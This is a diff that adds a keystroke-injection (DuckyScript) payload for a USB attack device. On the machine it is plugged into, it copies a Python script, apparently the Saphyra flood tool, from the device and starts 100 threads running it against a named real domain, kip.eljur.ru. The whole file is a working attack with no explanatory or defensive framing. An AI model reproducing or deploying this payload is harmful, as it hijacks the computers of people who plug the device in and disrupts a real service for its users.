@@ -1,0 +1,43 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 300
+STRING cd Desktop
+ENTER
+STRING copy "E:\saphyra.txt" saphyra.py
+ENTER
+DELAY 3200
+ENTER
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2500
+STRING cd Desktop
+ENTER
+DELAY 250
+STRING python
+ENTER
+DELAY 2000
+STRING import threading
+ENTER
+DELAY 2000
+STRING import os
+ENTER
+DELAY 2000
+STRING def main():
+ENTER
+STRING     os.system("python saphyra.py kip.eljur.ru")
+ENTER
+ENTER
+STRING for _ in range(100):
+ENTER
+STRING     t = threading.Thread(target=main, args=())
+ENTER
+STRING     t.start()
+ENTER
+GUI r
+DELAY 1000
+STRING https://github.com/urllib3/urllib3
